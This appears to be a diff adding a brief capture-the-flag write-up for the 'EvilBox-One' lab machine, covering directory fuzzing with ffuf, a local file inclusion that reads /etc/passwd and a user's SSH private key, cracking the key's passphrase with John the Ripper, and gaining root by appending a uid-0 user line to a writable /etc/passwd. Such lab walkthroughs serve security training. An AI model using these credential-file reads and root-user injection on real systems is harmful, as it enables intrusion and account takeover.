@@ -1,0 +1,57 @@
+
+Write up foe EvilBox-One
+
+192.168.238.212
+use namp 
+open port 22,http
+use dirb 
+dirb http://192.168.175.212
+Found directory secret , but blank 
+
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.175.212/FUZZ
+
+Try to find available file with .php extension
+
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.175.212/secret/FUZZ.php
+got evil.php
+
+Checked for LFI vulnerability 
+
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.238.212/secret/evil.php?FUZZ=/etc/passwd -fs 0
+command 
+http://192.168.238.212/secret/evil.php?command=/etc/passwd
+
+username: mowree
+checked shadow but failed
+
+Possiblity to get ssh key 
+http://192.168.238.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
+I got it view page source and copy key into a file name id_rsa
+save it
+
+I can login using this key 
+
+ssh -i id_rsa mowree@192.168.238.212
+It was asking for password, i dont have 
+
+ssh2john id_rsa >key_ssh.hash
+Now crack the hash
+john key_ssh.hash 
+got password unicorn
+Again login 
+ssh -i id_rsa mowree@192.168.238.212
+
+Privilege Escalation 
+sudo -l (no luck)
+find / -perm -us=s 2>/dev/null (no luck)
+I dont want search manual any more use linpeas.sh
+transfer linpeas.sh from kali to target machine 
+and run it
+
+I found /etc/passwd is writable :)
+
+openssl passwd toor
+echo "root2:nAnaoYBaxtjnE:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+Got root access
+
